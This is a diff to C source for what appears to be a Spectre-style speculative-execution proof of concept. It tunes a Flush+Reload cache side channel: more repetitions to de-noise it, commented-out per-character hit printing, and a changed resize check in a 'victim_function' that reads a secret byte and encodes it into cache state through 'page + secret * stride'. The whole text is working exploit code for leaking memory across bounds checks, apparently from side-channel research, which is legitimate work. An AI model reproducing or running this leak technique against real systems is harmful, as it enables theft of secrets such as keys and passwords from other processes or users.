@@ -83,7 +83,7 @@ char random_char(){
 
 
 
-#define REP 10 // Number of repetitions to de-noise the channel
+#define REP 100 // Number of repetitions to de-noise the channel
 #define TRAINING_EPOCH 32 // 15 in-bound accesses then 1 out-of-bound access
 #define BUF_SIZE 1
 
@@ -114,6 +114,11 @@ void decode_flush_reload_state(char *c, uint64_t *hits, size_t cnt) {
             most_hits = hits[i];
             raw_c = i;
         }
+
+        // if (hits[i] > 0){
+        //     printf("Character '%c' (ASCII=%#4x) has %3lu hits\n",
+        //            isprint(i) ? i : '?', i, hits[i]);
+        // }
     }
 
     *c = isprint(raw_c) ? raw_c : '?';
@@ -158,11 +163,14 @@ uint64_t calibrate_latency() {
 }
 
 uint8_t* victim_function(uint8_t** array, uint8_t * page, uint32_t index, uint32_t stride, uint32_t new_size) {
-    if (new_size < array_size / 2 || new_size > array_size) {
+    if (new_size <= array_size && new_size >= (array_size / 2) && new_size > 0) {
         uint8_t *old_array = *array;
         *array = realloc(*array, new_size);
         memcpy(*array, old_array, array_size); // move the old content
     }
+    // uint8_t *old_array = *array;
+    // *array = realloc(*array, new_size);
+    // memcpy(*array, old_array, array_size); // move the old content
     index &= array_index_mask_nospec(index, new_size);
     uint8_t secret = (*array)[index];
     _maccess(page + secret * stride);
